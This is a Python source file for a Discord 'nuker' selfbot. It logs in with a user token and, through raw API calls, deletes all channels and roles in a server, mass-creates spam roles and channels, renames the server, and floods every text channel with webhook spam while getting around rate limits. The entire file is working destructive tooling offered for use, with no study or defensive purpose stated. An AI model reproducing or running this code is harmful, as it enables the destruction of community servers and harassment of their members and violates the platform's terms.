import requests , gratient
from websocket import WebSocket
from concurrent.futures import ThreadPoolExecutor
from json import loads, dumps, load
import random, discord, threading, os, datetime, asyncio
from time import sleep
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from requests import get
from subprocess import check_output
from os import system

from colorama import Fore
from discord.ext import (
    commands,
)


with open('config.json') as settings:
    config = load(settings)

color = 0x003240
under = "\n\n\n\n\n\n"
space = "                          "

token = config.get('token')
prefix = config.get('prefix')
content = config.get('content')
description = config.get('description')
image_url = config.get('image_url')
webhook_name = config.get('webhook_name')
webhook_title = config.get('webhook_title')
time = datetime.datetime.utcnow()
title_url = config.get('title_url')
icon_url = config.get('icon_url')
avatar_url = config.get('avatar_url')
footer = config.get('embed_footer')


intents = discord.Intents.default()
intents.presences = True
intents.members = True
bot = discord.Client()
bot = commands.Bot(
    description='Selfbot',
    command_prefix=prefix,
    self_bot=True
)    

bot.remove_command('help')
def newpage():
    os.system('cls & title Leyland Shop Nuker Discord 2023')
    print(Colorate.Horizontal(Colors.blue_to_cyan, f"""  
    
██╗     ███████╗██╗   ██╗██╗      █████╗ ███╗   ██╗██████╗     ███████╗██╗  ██╗ ██████╗ ██████╗     
██║     ██╔════╝╚██╗ ██╔╝██║     ██╔══██╗████╗  ██║██╔══██╗    ██╔════╝██║  ██║██╔═══██╗██╔══██╗    
██║     █████╗   ╚████╔╝ ██║     ███████║██╔██╗ ██║██║  ██║    ███████╗███████║██║   ██║██████╔╝    
██║     ██╔══╝    ╚██╔╝  ██║     ██╔══██║██║╚██╗██║██║  ██║    ╚════██║██╔══██║██║   ██║██╔═══╝     
███████╗███████╗   ██║   ███████╗██║  ██║██║ ╚████║██████╔╝    ███████║██║  ██║╚██████╔╝██║         
╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝         
                         
                       {prefix}dc       deteleallchananal
                       {prefix}dr       deteleallrole
                       {prefix}sr  [amount] [name]  spamrole
                       {prefix}sc  [amount] [name]  spamchananal
                       {prefix}nuker  [amount] [name]  nukerdiscord 
                       {prefix}wssp  spamwebhookall

    """))

    
def start():
    bot.run(token, bot=False, reconnect=True)
    
@bot.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        pass
    elif isinstance(error, commands.CheckFailure):
        pass
    elif isinstance(error, commands.MissingRequiredArgument):
        pass
    elif isinstance(error, discord.errors.Forbidden):
        pass
    elif "Cannot send an empty message" in error_str:
        pass
    else:
        pass

@bot.event
async def on_connect():
    newpage()

def deletechannel(channeldetails):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.delete(f"https://canary.discord.com/api/v9/channels/{channeldetails}",headers=headers)
    except:
        pass

def deleterole(guild,roledetails):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{roledetails}",headers=headers)
    except:
        pass

def spamrole(guild,nameofchan):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        randcolor = random.randint(0x000000, 0xFFFFFF)
        requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles",headers=headers,json={"name":nameofchan,"permissions":"2251804225","color":randcolor,"mentionable":"true"})
    except:
        pass

def textcspam(guild,nameofchan):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.post(f"https://canary.discord.com/api/v9/guilds/{guild}/channels",headers=headers,json={"type":"0","name":nameofchan})
    except:
        pass
        
def webspam(webhook):
    global spammingdawebhookeroos
    while spammingdawebhookeroos:
        randcolor = random.randint(0x000000, 0xFFFFFF)
        data = {
          "content": f"{content}",
          "embeds": [
            {
              "title": f"{webhook_title}",
              "tts": "true",
              "description": f"\n{description}",
              "url": f"{image_url}",
              "color": f"{randcolor}",
              "timestamp": f"{time}",
              "author": {
                "name": f"{webhook_name}",
                "url": f"{title_url}",
                "icon_url": f"{icon_url}"
              },
              "footer": {
                "text": f"{footer}",
                "icon_url": f"{icon_url}"
              },
              "image": {
                "url": f"{image_url}"
              }
            }
          ],
          "username": f"{webhook_name}",
          "avatar_url": f"{avatar_url}"
        }
        spamming = requests.post(webhook, json=data)  
        spammingerror = spamming.text
        if spamming.status_code == 204:
            pass
        elif "rate limited" in spammingerror.lower():
            try:
                j = loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                sleep(delay)
        else:
            delay = random.randint(30, 60)
            sleep(delay)
            
@bot.command()
async def dc(ctx):
    await ctx.message.delete()
    for chan in ctx.guild.channels:
        try:
            threading.Thread(target = deletechannel, args = (chan.id,)).start() 
        except:
            pass

@bot.command()
async def dr(ctx):
    await ctx.message.delete()
    for rol in ctx.guild.roles:
        threading.Thread(target = deleterole, args = (ctx.guild.id,rol.id,)).start()

@bot.command()
async def sr(ctx,amount=None,*,nameofthem=None):
    await ctx.message.delete()
    for i in range(int(amount)):
        threading.Thread(target = spamrole, args = (ctx.guild.id,nameofthem,)).start()

@bot.command()
async def sc(ctx,amount=None,*,nameofthem=None):
    await ctx.message.delete()
    for i in range(int(amount)):
        threading.Thread(target = textcspam, args = (ctx.guild.id,nameofthem,)).start()
        
        
@bot.command()
async def wssp(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target = webspam, args = (webhook.url,)).start()
    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 50 / len(ctx.guild.text_channels) 
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            webhook =await channel.create_webhook(name=f"{str(webhook_name)}")
            threading.Thread(target = webspam, args = (webhook.url,)).start()

@bot.command()
async def nuker(ctx, amount, *, roname):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            threading.Thread(target = deletechannel, args = (channel.id,)).start() 
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            threading.Thread(target = deleterole, args = (ctx.guild.id,role.id,)).start()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=roname,
            description="Leyland Shop Nuker",
            reason="Leyland Shop Nuker",
            icon=None,
            banner=None
        )  
    except:
        pass        
    for _i in range(int(amount)):
        threading.Thread(target = textcspam, args = (ctx.guild.id,roname,)).start()
    for _i in range(int(amount)):
        threading.Thread(target = spamrole, args = (ctx.guild.id,roname,)).start()
        
        
start()        